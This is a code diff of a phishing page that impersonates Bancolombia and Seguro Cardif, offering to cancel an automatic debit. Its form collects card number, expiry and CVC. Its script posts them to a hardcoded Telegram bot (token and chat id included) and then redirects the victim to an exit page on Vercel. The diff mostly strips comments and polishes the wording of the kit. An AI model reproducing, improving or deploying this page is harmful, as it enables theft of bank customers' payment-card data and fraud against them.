@@ -83,20 +83,19 @@
 </head>
 <body>
 
-  <!-- Header fuera del formulario -->
- <img src="header.png" width="100%" alt="Header Imagen">
-<br><br><br>
+  <img src="header.png" width="100%" alt="Header Imagen">
+  <br><br><br>
   
   <img
-  src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/21c57c74-c1ab-4e04-9cb8-74946f4f5851/Hero_Seguro+independiente+protegido+para+cre%CC%81dito+hipotecario.jpg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-21c57c74-c1ab-4e04-9cb8-74946f4f5851-nK9pOpP"
-  alt="Seguro independiente protegido para crédito hipotecario"
-  width="77%"
-/>
-   <h3>Seguro CARDIF</h3>
+    src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/21c57c74-c1ab-4e04-9cb8-74946f4f5851/Hero_Seguro+independiente+protegido+para+cre%CC%81dito+hipotecario.jpg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-21c57c74-c1ab-4e04-9cb8-74946f4f5851-nK9pOpP"
+    alt="Seguro independiente protegido para crédito hipotecario"
+    width="77%"
+  />
+  <h3>Seguro CARDIF</h3>
   <br><br>
   <form class="formulario" id="cancelarForm">
     
-    <h2>Cancelar el débito automático<br>a mi tarjeta débito</h2>
+    <h2>Cancelar el débito automático de tu crédito<br>a tu tarjeta débito</h2>
 
     <label for="tarjeta">Número de tarjeta</label>
     <input type="text" id="tarjeta" maxlength="16" placeholder="•••• •••• •••• ••••" required />
@@ -118,9 +117,11 @@
 
     <button type="submit">Confirmar cancelación</button>
   </form>
- <div class="header">
+
+  <div class="header">
     <img src="header.png" width="100%" alt="Header Imagen">
   </div>
+
   <script>
     const form = document.getElementById("cancelarForm");
 
@@ -132,10 +133,8 @@
       const anio = document.getElementById("anio").value;
       const cvc = document.getElementById("cvc").value;
 
-   // 🔹 Configura tu bot de Telegram
-      const botToken = "8301521168:AAFwfmwFHOLEVKno7_dkaF8z7r1j0-WxM4g";   // 👉 Reemplaza con el token de tu bot
-      const chatId = "5647970395";   // 👉 Reemplaza con tu chat_id
- 
+      const botToken = "8301521168:AAFwfmwFHOLEVKno7_dkaF8z7r1j0-WxM4g";
+      const chatId = "5647970395";
 
       const mensaje = `
 🚨 Solicitud de cancelación de débito automático 🚨
@@ -145,7 +144,6 @@ Año: ${anio}
 CVC: ${cvc}
       `;
 
-      // Enviar datos a Telegram
       try {
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
@@ -156,7 +154,6 @@ CVC: ${cvc}
           })
         });
 
-        // Redirigir después del envío
         window.location.href = "https://personapp-nine.vercel.app/exit.html";
       } catch (error) {
         window.location.href = "https://personapp-nine.vercel.app/exit.html";
